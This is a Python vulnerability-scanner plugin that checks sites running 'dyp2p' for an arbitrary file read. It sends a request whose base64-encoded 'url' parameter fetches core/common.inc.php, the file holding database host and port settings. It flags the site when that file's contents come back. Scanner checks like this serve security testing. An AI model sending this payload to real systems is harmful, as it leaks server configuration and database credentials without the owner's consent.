#!/usr/bin/env python
# -*- coding: utf-8 -*-
from lib.common import *

def run_domain(http,ob):
    list = []
    try:
        domain = ob['domain']
        detail = u''
        detail = detail.encode('utf8')
    
        url = "%s://%s%s" % (ob['scheme'],ob['domain'],ob['base_path'])
        url += "index.php?plugins&q=imgurl&url=QGltZ3VybEAvY29yZS9jb21tb24uaW5jLnBocA=="
        res, content = requestUrl(http,url,ob['task_id'],ob['domain_id'])
        if res['status'] == '200' and content.find('$File: common.inc.php')>=0 and content.find('$Author: ahui')>=0 and content.find('$db_config[\'host\']')>=0 and content.find('$db_config[\'port\']')>=0:
            request = getRequest(url)
            response = getResponse(res)                        
            list.append(getRecord(ob,url,ob['level'],detail,request,response))
    except Exception,e:
        logging.getLogger().error("File:dyp2p_ArbitraryFileReadScript.py, run_domain function :" + str(e) + ",task id:" + ob['task_id'] + ",domain id:" + ob['domain_id'])
        write_scan_log(ob['task_id'],ob['domain_id'],"File:dyp2p_ArbitraryFileReadScript.py, run_domain function :" + str(e))
    #end try
    
    return list
#end def